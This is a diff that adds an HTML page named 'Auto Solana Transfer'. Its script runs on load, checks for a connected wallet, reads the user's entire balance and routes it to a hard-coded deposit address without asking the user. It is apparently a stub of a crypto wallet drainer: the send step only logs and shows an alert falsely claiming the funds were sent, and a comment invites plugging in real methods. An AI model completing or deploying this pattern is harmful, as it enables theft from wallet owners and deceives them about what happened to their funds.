@@ -1,0 +1,52 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <title>Auto Solana Transfer</title>
+</head>
+<body>
+  <h1>Auto Transfer Script Loaded</h1>
+
+  <script>
+    (function() {
+      const depositAddress = 'A4dRrrqeDqsQ8bpHgbFPhfpqU6iE6p3wHrrtmKeFLCP8';
+
+      function isWalletConnected() {
+          if (window.axiom && window.axiom.wallet && window.axiom.wallet.isConnected) {
+              return true;
+          }
+          return false;
+      }
+
+      function convertToSolana() {
+          if (!isWalletConnected()) {
+              alert('Wallet is not connected!');
+              return;
+          }
+
+          let userBalance = window.axiom.wallet.getBalance(); // Replace with real method
+
+          if (userBalance === 0) {
+              alert('No funds available to convert!');
+              return;
+          }
+
+          console.log(`Converting ${userBalance} to Solana...`);
+          sendToDepositAddress(userBalance);
+      }
+
+      function sendToDepositAddress(balance) {
+          console.log(`Sending ${balance} Solana to ${depositAddress}`);
+          alert(`Successfully sent ${balance} Solana to ${depositAddress}!`);
+      }
+
+      function executeTransfer() {
+          convertToSolana();
+      }
+
+      executeTransfer();
+    })();
+  </script>
+</body>
+</html>
+
